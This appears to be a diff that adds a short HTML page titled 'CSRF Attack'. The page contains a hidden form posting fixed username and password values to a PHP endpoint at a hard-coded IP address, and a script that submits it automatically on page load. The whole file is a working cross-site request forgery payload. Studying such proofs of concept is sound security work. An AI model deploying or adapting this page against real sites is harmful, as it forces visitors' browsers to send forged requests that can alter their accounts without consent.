@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+
+<form id="attackForm" action="http://147.182.151.186/csfr.php" method="POST">
+    <input type="hidden" name="username" value="host">
+    <input type="hidden" name="password" value="pass">
+</form>
+
+<script>
+    document.getElementById("attackForm").submit();
+</script>
+
+</body>
+</html>
